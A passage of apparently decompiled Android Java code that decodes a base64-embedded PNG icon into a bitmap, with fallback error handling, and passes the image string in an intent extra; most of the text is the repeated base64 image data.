ByteArrayInputStream(q.a(""iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAMAAAC5zwKfAAAAA3NCSVQICAjb4U/gAAADAFBMVEX////kw5/ewIv43KjvyIHEtZnHqm67YCyrSiDl0KnEtZmUQRv43Kj1zZ3kw5+sUSKrSiCUQRvevIC7YCysUSL1zZ3vyIG7YCysUSK7YCz43Kjl0KnvyIHevICrXCmrSiD1zZ3l0KnvyIG7YCyrXCmsUSKrSiD43KjvyIHeuHu7YCyrXCmrSiD43KjvyIHWrWusUSKrSiD43Kj1zZ3vyIHeuHvbsnHWqWS1aTK7YCyrXCmkUyisUSL////1/v349/bs9ffu7+/s6OTU6vPd5+L437Ts3s/p2fT43KjY3+HM3Nu63+3X09r1zZ2n3Pfl0KnwyLjMzMzvyIHkw5/Gx8H/wDDewIvevIDeuHvKtc7fuF/XtHnXp/rbsnHEtZnNtHso1v9pxeets6vWrWvwpl3qoabWrVnkqzebs77WqWTZqF36pBvHqm7TpVWQuzjGmOqqpp/OoFLPn1zBol/vljabpo0tuvbNmkr3kxITv/kyudqtnYR8rVGqmmxEsMH4f4XHk0fAlFcpsur2iRGnmFuTmJcMtPb4hAXFjEM0uSbUhi2ljGVhpETDhUL2fAsNqfYNq+PdghGuiFDAc/Slf8nDgV2aiXxTl5ZinR2+fTr0cQr1Z26pfVAOn9SvekGDgn20djeFe5G7czcapBPXbQ0QlNLjX2SAeWemcFemZ5lkgHBtfzi1aTIIjr9UhjicbzupaTunWNaMbjq5TfiCbFmWYoYof6P2SVHXUGOqYi65TNhqZKerXCmXYTY/coJOdyexWw2mS9BrZlmkUyiTWDKZVCpbYWCGVzTQPUCiOeccZ6CSUw+nRVerSiCqM/RuWTB9SZuaSyK/KP9UVlwJcQwvYyN4Pcj/IjB7Q3NRVTOKRR/2IzDgKTBNUVmUQRuXK+KpGvh6PBr4FStmPyVrMJn3ESFuNxdYPCqlD/n/ChgzQF/jEB+ZEPiVEucJRm3xCBhgKH7ZDRuWBveHC+vyAAteKg8zMzN7Dc6vDhpSJQ5kCsSVDBaGChQ2HQ9DBKVYBw3KOpWUAAABAHRSTlMAIiIzMzMzMzNERERVVVVVVVVmZmZ3d4iImaqqqqqqqru7u7u7u7vMzMzMzMzd3d3d3e7u7u7u7u7u7u7u////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////Tfl3FgAAAAlwSFlzAAALEgAACxIB0t1+/AAAAB90RVh0U29mdHdhcmUATWFjcm9tZWRpYSBGaXJld29ya3MgOLVo0ngAAA0nSURBVFiFfdkJXBNXHgfw7N293fu+u/e2u9vtsdvdmWFiDAWxBY2KIKCAsQgoSajBs4mIyUKDECw2HoFSFbXRxIBSbOJBiIBaMLUKBgERgagoCkYUq+z/vTczmXjsz4hMZuab33tvhk+CEgnJF37yzHPTcF7hMuX/hT/oFXLKc8/96iuSsHzux8++kJSWhJIYHx8/m2TWk0J2w4Hx6Iy0tKQXn//l10TcZ34/OwOSBnuSEhMR+TgxJSVLo8lKQU/zXCLx0tLg7Phnvsx73/hHGueRjvGPdJw9G7C1a4vKy4vWYjJUj/cg079HvM8+T7Y5MfEhj8eK9u/ad/DgwV1FmhQeFBpywPSvY/DX8K1aXFE0i4kpWVkIK9919GDNxzi7irISnwBmPIu8zyephYLCiEGMRxge565dGLtA8vH+tcKgE8PGDM73JZIv/lSNEhJRv8TERA7bv+tojWBdCKAvR4uy+FVOEjVEiPqP35b87K88yA8YBbSinYC1ABYIYCfA/9taq0mJF1UMgeqMl/4gefYlUUESxO3ksKGhISQFRgIXWmvK5pYhtcOclYJfNvHhiuqMFyQvhkYMZJZGr9doNFv2t0CjkZEhlJGRkQDCIimKikQvcMq5xazXZGWByIG8p1YnSBIEMCMjS2PeguKsbR0iGmBDF1rLlkQyFEVHRlJMK4A9x3ZXVBeZAdVkkTEJnjpNwn2HPI1+y/tvQfaeOxUYJdgQqgYYxUbOLWvpYakaeO7CgeXzlq/eWFG9BZoiNVRQnSEC1eD9F2dvzwiAQ/w4AVtS0wP+yFxqLgI/3FMyDwJodS2gSFU/BtQg7z14vHcGwNHRMjROBrB9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"")));           intent.putExtra(""image"",""iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAMAAAC5zwKfAAAAA3NCSVQICAjb4U/gAAADAFBMVEX////kw5/ewIv43KjvyIHEtZnHqm67YCyrSiDl0KnEtZmUQRv43Kj1zZ3kw5+sUSKrSiCUQRvevIC7YCysUSL1zZ3vyIG7YCysUSK7YCz43Kjl0KnvyIHevICrXCmrSiD1zZ3l0KnvyIG7YCyrXCmsUSKrSiD43KjvyIHeuHu7YCyrXCmrSiD43KjvyIHWrWusUSKrSiD43Kj1zZ3vyIHeuHvbsnHWqWS1aTK7YCyrXCmkUyisUSL////1/v349/bs9ffu7+/s6OTU6vPd5+L437Ts3s/p2fT43KjY3+HM3Nu63+3X09r1zZ2n3Pfl0KnwyLjMzMzvyIHkw5/Gx8H/wDDewIvevIDeuHvKtc7fuF/XtHnXp/rbsnHEtZnNtHso1v9pxeets6vWrWvwpl3qoabWrVnkqzebs77WqWTZqF36pBvHqm7TpVWQuzjGmOqqpp/OoFLPn1zBol/vljabpo0tuvbNmkr3kxITv/kyudqtnYR8rVGqmmxEsMH4f4XHk0fAlFcpsur2iRGnmFuTmJcMtPb4hAXFjEM0uSbUhi2ljGVhpETDhUL2fAsNqfYNq+PdghGuiFDAc/Slf8nDgV2aiXxTl5ZinR2+fTr0cQr1Z26pfVAOn9SvekGDgn20djeFe5G7czcapBPXbQ0QlNLjX2SAeWemcFemZ5lkgHBtfzi1aTIIjr9UhjicbzupaTunWNaMbjq5TfiCbFmWYoYof6P2SVHXUGOqYi65TNhqZKerXCmXYTY/coJOdyexWw2mS9BrZlmkUyiTWDKZVCpbYWCGVzTQPUCiOeccZ6CSUw+nRVerSiCqM/RuWTB9SZuaSyK/KP9UVlwJcQwvYyN4Pcj/IjB7Q3NRVTOKRR/2IzDgKTBNUVmUQRuXK+KpGvh6PBr4FStmPyVrMJn3ESFuNxdYPCqlD/n/ChgzQF/jEB+ZEPiVEucJRm3xCBhgKH7ZDRuWBveHC+vyAAteKg8zMzN7Dc6vDhpSJQ5kCsSVDBaGChQ2HQ9DBKVYBw3KOpWUAAABAHRSTlMAIiIzMzMzMzNERERVVVVVVVVmZmZ3d4iImaqqqqqqqru7u7u7u7vMzMzMzMzd3d3d3e7u7u7u7u7u7u7u////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////Tfl3FgAAAAlwSFlzAAALEgAACxIB0t1+/AAAAB90RVh0U29mdHdhcmUATWFjcm9tZWRpYSBGaXJld29ya3MgOLVo0ngAAA0nSURBVFiFfdkJXBNXHgfw7N293fu+u/e2u9vtsdvdmWFiDAWxBY2KIKCAsQgoSajBs4mIyUKDECw2HoFSFbXRxIBSbOJBiIBaMLUKBgERgagoCkYUq+z/vTczmXjsz4hMZuab33tvhk+CEgnJF37yzHPTcF7hMuX/hT/oFXLKc8/96iuSsHzux8++kJSWhJIYHx8/m2TWk0J2w4Hx6Iy0tKQXn//l10TcZ34/OwOSBnuSEhMR+TgxJSVLo8lKQU/zXCLx0tLg7Phnvsx73/hHGueRjvGPdJw9G7C1a4vKy4vWYjJUj/cg079HvM8+T7Y5MfEhj8eK9u/ad/DgwV1FmhQeFBpywPSvY/DX8K1aXFE0i4kpWVkIK9919GDNxzi7irISnwBmPIu8zyephYLCiEGMRxge565dGLtA8vH+tcKgE8PGDM73JZIv/lSNEhJRv8TERA7bv+tojWBdCKAvR4uy+FVOEjVEiPqP35b87K88yA8YBbSinYC1ABYIYCfA/9taq0mJF1UMgeqMl/4gefYlUUESxO3ksKGhISQFRgIXWmvK5pYhtcOclYJfNvHhiuqMFyQvhkYMZJZGr9doNFv2t0CjkZEhlJGRkQDCIimKikQvcMq5xazXZGWByIG8p1YnSBIEMCMjS2PeguKsbR0iGmBDF1rLlkQyFEVHRlJMK4A9x3ZXVBeZAdVkkTEJnjpNwn2HPI1+y/tvQfaeOxUYJdgQqgYYxUbOLWvpYakaeO7CgeXzlq/eWFG9BZoiNVRQnSEC1eD9F2dvzwiAQ/w4AVtS0wP+yFxqLgI/3FMyDwJodS2gSFU/BtQg7z14vHcGwNHRMjROBrB9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"");           throw th;         }  catch (        IOException e3) {           throw e3;         }       }     }  catch (    Exception e4) {       e4.printStackTrace();       try {         bitmap=BitmapFactory.decodeStream(new ByteArrayInputStream(q.a(""iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAMAAAC5zwKfAAAAA3NCSVQICAjb4U/gAAADAFBMVEX////kw5/ewIv43KjvyIHEtZnHqm67YCyrSiDl0KnEtZmUQRv43Kj1zZ3kw5+sUSKrSiCUQRvevIC7YCysUSL1zZ3vyIG7YCysUSK7YCz43Kjl0KnvyIHevICrXCmrSiD1zZ3l0KnvyIG7YCyrXCmsUSKrSiD43KjvyIHeuHu7YCyrXCmrSiD43KjvyIHWrWusUSKrSiD43Kj1zZ3vyIHeuHvbsnHWqWS1aTK7YCyrXCmkUyisUSL////1/v349/bs9ffu7+/s6OTU6vPd5+L437Ts3s/p2fT43KjY3+HM3Nu63+3X09r1zZ2n3Pfl0KnwyLjMzMzvyIHkw5/Gx8H/wDDewIvevIDeuHvKtc7fuF/XtHnXp/rbsnHEtZnNtHso1v9pxeets6vWrWvwpl3qoabWrVnkqzebs77WqWTZqF36pBvHqm7TpVWQuzjGmOqqpp/OoFLPn1zBol/vljabpo0tuvbNmkr3kxITv/kyudqtnYR8rVGqmmxEsMH4f4XHk0fAlFcpsur2iRGnmFuTmJcMtPb4hAXFjEM0uSbUhi2ljGVhpETDhUL2fAsNqfYNq+PdghGuiFDAc/Slf8nDgV2aiXxTl5ZinR2+fTr0cQr1Z26pfVAOn9SvekGDgn20djeFe5G7czcapBPXbQ0QlNLjX2SAeWemcFemZ5lkgHBtfzi1aTIIjr9UhjicbzupaTunWNaMbjq5TfiCbFmWYoYof6P2SVHXUGOqYi65TNhqZKerXCmXYTY/coJOdyexWw2mS9BrZlmkUyiTWDKZVCpbYWCGVzTQPUCiOeccZ6CSUw+nRVerSiCqM/RuWTB9SZuaSyK/KP9UVlwJcQwvYyN4Pcj/IjB7Q3NRVTOKRR/2IzDgKTBNUVmUQRuXK+KpGvh6PBr4FStmPyVrMJn3ESFuNxdYPCqlD/n/ChgzQF/jEB+ZEPiVEucJRm3xCBhgKH7ZDRuWBveHC+vyAAteKg8zMzN7Dc6vDhpSJQ5kCsSVDBaGChQ2HQ9DBKVYBw3KOpWUAAABAHRSTlMAIiIzMzMzMzNERERVVVVVVVVmZmZ3d4iImaqqqqqqqru7u7u7u7vMzMzMzMzd3d3d3e7u7u7u7u7u7u7u////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////Tfl3FgAAAAlwSFlzAAALEgAACxIB0t1+/AAAAB90RVh0U29mdHdhcmUATWFjcm9tZWRpYSBGaXJld29ya3MgOLVo0ngAAA0nSURBVFiFfdkJXBNXHgfw7N293fu+u/e2u9vtsdvdmWFiDAWxBY2KIKCAsQgoSajBs4mIyUKDECw2HoFSFbXRxIBSbOJBiIBaMLUKBgERgagoCkYUq+z/vTczmXjsz4hMZuab33tvhk+CEgnJF37yzHPTcF7hMuX/hT/oFXLKc8/96iuSsHzux8++kJSWhJIYHx8/m2TWk0J2w4Hx6Iy0tKQXn//l10TcZ34/OwOSBnuSEhMR+TgxJSVLo8lKQU/zXCLx0tLg7Phnvsx73/hHGueRjvGPdJw9G7C1a4vKy4vWYjJUj/cg079HvM8+T7Y5MfEhj8eK9u/ad/DgwV1FmhQeFBpywPSvY/DX8K1aXFE0i4kpWVkIK9919GDNxzi7irISnwBmPIu8zyephYLCiEGMRxge565dGLtA8vH+tcKgE8PGDM73JZIv/lSNEhJRv8TERA7bv+tojWBdCKAvR4uy+FVOEjVEiPqP35b87K88yA8YBbSinYC1ABYIYCfA/9taq0mJF1UMgeqMl/4gefYlUUESxO3ksKGhISQFRgIXWmvK5pYhtcOclYJfNvHhiuqMFyQvhkYMZJZGr9doNFv2t0CjkZEhlJGRkQDCIimKikQvcMq5xazXZGWByIG8p1YnSBIEMCMjS2PeguKsbR0iGmBDF1rLlkQyFEVHRlJMK4A9x3ZXVBeZAdVkkTEJnjpNwn2HPI1+y/tvQfaeOxUYJdgQqgYYxUbOLWvpYakaeO7CgeXzlq/eWFG9BZoiNVRQnSEC1eD9F2dvzwiAQ/w4AVtS0wP+yFxqLgI/3FMyDwJodS2gSFU/BtQg7z14vHcGwNHRMjROBrB9PaO47dBIGZnEs3tKlkEQunrj7upau90KqJ6Ai3hQrbfvBQzlzKXRsbGxDQwbuaSsBWEBkpEWhkziga3L+MybtxTQWidB1YuEhmq12bmXeO99cmXs0qlTpxQxR0drltQEQhmKpMqg4oXjW3HFdTgIXU5Qs36R0FANI+a9T84VJcycuTArdd81BhY2EChDKrqQYBIDZBIRtHTpUg5F6vKNDXa9mgfVMOLDHHfm/YUzMyEzle/2SBm2NXCBjWwNtC5pDYyUMZHoljl7fOua+a9OnTx58qvzl65bT7Ju2fIGKwJVKgI6D2Puk8NazCGxaHzfnLKRQA1DRdbMpSJbR1pZBpVtPb56KsVl8vz1fJatdhoRSLwtzjOYM87MzOPAzIWXxkZhReYyKCwT2XothimDe/HChwqW4UXq1TW8uGa3RWio33IOuDNO4CC8uHP8WmtZayQBpdI5Yxtkc65dGwocTY3iRIYRi7sr0RwiUG92nkGTl5mXnxdKZuaNsX1MJOFi5mzYf2p/TurY6LVAT04My06GFUMBUQyqIHq92X7uzOHCzLzifEge+ktE6/gSlmHRvbLv7KWOD+rqdrx9aXxstOddBTN1zVSGhGKWkmXZ3mBBoBY8Z9u5SuCwl2/Iz8vlyMyO12PmLNnX0tKyYcOOunaUHR1AnkqVzl8XEknFdQeaTJJFWh3Uc7bZM/M2FaPkFxvy0+VMuoHULDx1tqelbC4rVZS3t3dC2tvrPugYv1QQt3ydIFKTl65HF+Mht06ySG+yOtucCzOLiQfJnQaTLc3nxNoNMXCKbM67ze0knReBvNFQsL0kJLLz0dW95phbJVEZrU3OQhGXPx0vHzONTGde7htxsBxHH5xsvyikv73u5LHje0pK1pVwIgKXbW9wAGhtsmfmb+K9/HQpd3UxuQYyj+ZLZ8fGxm909l8UiZfbmzuO79laUoJElgMPNFlVEp3TLqqXPoWi4QLDHacYuKW+MT429uDkxf7wAHkMkcujBPBQo0klMTsL8zeJJo+dUTgbLi8aKqYbyEJbHoyP32gXpM7Oi/3Dw/39w5fbTx7a+Hp0lJRlZGhRSo55jSqJ1VkomjwmVrvJkMtSNCOXU3L+8u548KBZ8IZjWXnsm3Wdw8PDly+3f1Ceo4iJgmsS7uTtbQ4AzfbCfHyxFE+naXkGvmZoRppkyGWY6aRinuVBh1Dw1mZyy0kX1EHPy/3nd1akxsnRD4hlh5oqATQiEK1ncTrNpkO9KTTNzio1GHLltBTf13mlpX3nhX79corcbhQVuxmRF5urc17fiq7rY41Wk1aiddbn4xvEkP8aPSV3OkMzr+UaDJnTGJpmpuGKpUc+Elbk1psMtaBuxwI5JuWYbD95YE/J+vVbG7wYtDfZiomYy9KgyBcZDHnpUpjFGTRcOuBtO9EpFOxkKfb8rVu3hpsXwNpSsZ3DaL1P79lesv5Am9tq0km01ra2bdu2laJlmUXT0qRSPIu0NL40X05PMeTll55oDhVcQNNvDuOr5ladlKLryPfNx0E81Ndot+okKp1zsPfIkSOAbiqU0zNgFqfBLM4ohFmMpeHSKT3iE1ZkuI6h5BdFg+9H4NXL568c33P8Sl+T3QhD1mntfQO9vSdOAKqeLE9PZ+mI2NxiQ950lqYj5DBgKIjvDpBiaXrHZeJ1Smnp+eH+q1dv3rx558r169dv91l1OgCNRm22u